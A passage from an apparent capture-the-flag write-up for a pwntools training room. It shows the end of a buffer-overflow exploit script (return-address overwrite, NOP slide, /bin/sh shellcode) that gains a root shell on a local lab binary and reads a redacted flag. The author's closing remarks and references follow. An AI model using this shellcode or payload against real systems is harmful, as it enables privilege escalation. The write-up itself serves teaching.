eip = p32(0xffffd510+200)

nop_slide = b"\x90" * 1000

shellcode = b"jhh\x2f\x2f\x2fsh\x2fbin\x89\xe3jph\x01\x01\x01\x01\x814\x24ri\x01,1\xc9Qj\x07Y\x01\xe1Qj\x08Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80"

payload = padding + eip + nop_slide + shellcode

proc.send(payload)

proc.interactive()

buzz@ip-10-67-167-144:~/IntroToPwntools/IntroToPwntools/shellcraft$ python exploit.py 
[+] Starting local process './intro2pwnFinal': pid 2202
[*] Switching to interactive mode
$ whoami
root
$ 
```

Answer: `root`

#### What is the flag?

```bash
$ cat /root/flag.txt
flag{<REDACTED>}
$ quit
[*] Process './intro2pwnFinal' stopped with exit code 0 (pid 2202)
[*] Got EOF while sending in interactive
buzz@ip-10-67-167-144:~/IntroToPwntools/IntroToPwntools/shellcraft$ 
```

Abswer: `flag{<REDACTED>}`

### Task 6: Conclusion

I hope you have enjoyed our adventure through binary exploitation and pwntools! There's not much else to do on our box, unless you're a strange person who likes to snoop in other people's home directories.

#### Final Words

I want to emphasize that I am not an expert in software exploitation (or any other type of hacking). I'm just a student and enthusiast, and I wanted to share something that I enjoyed with the rest of y'all. This room scratched the surface of both binary exploitation in general and pwntools in particular, and there is a lot more out there to explore. Some resources that I have found helpful would be:

- [Live Overflow's Binary Exploit Playlist on YouTube](https://www.youtube.com/playlist?list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN) (this is where I first learned this stuff!)

- [Exploit Education website](https://exploit.education/) (Credit goes here, because the challenges for today were partially inspired by these exercises)

- [Nightmare course on GitHub](https://github.com/guyinatuxedo/nightmare/tree/master/modules) (a huge collection of challenges from old CTFs)

Also, I have learned a lot from the talented CTF players that I have met in my short time with the community.  I had a great time developing this room, and I hope you had a great time solving it. I may have more content to develop in the future. For now, it's been a pleasure, goodbye!

Sincerely,

DiZma$

For additional information, please see the references below.

## References

- [Address space layout randomization - Wikipedia](https://en.wikipedia.org/wiki/Address_space_layout_randomization)
- [Executable-space protection - Wikipedia](https://en.wikipedia.org/wiki/Executable-space_protection)
- [gets - Linux manual page](https://man7.org/linux/man-pages/man3/gets.3.html)
- [IntroToPwntools - GitHub](https://github.com/dizmascyberlabs/IntroToPwntools)
- [Position-independent code - Wikipedia](https://en.wikipedia.org/wiki/Position-independent_code)
- [pwndbg - Documentation](https://pwndbg.re/pwndbg/latest/)
- [pwndbg - GitHub](https://github.com/pwndbg/pwndbg/)
- [pwndbg - Homepage](https://pwndbg.re/)
- [pwntools - Documentation](https://docs.pwntools.com/en/stable/index.html)
- [pwntools - GitHub](https://github.com/Gallopsled/pwntools)
- [Python (programming language) - Wikipedia](https://en.wikipedia.org/wiki/Python_(programming_language))
- [Setuid - Wikipedia](https://en.wikipedia.org/wiki/Setuid)
- [Shellcode - Wikipedia](https://en.wikipedia.org/wiki/Shellcode)
- [x86 - Wikipedia](https://en.wikipedia.org/wiki/X86)
- [x86 assembly language - Wikipedia](https://en.wikipedia.org/wiki/X86_assembly_language)
- [x86 calling conventions - Wikipedia](https://en.wikipedia.org/wiki/X86_calling_conventions)
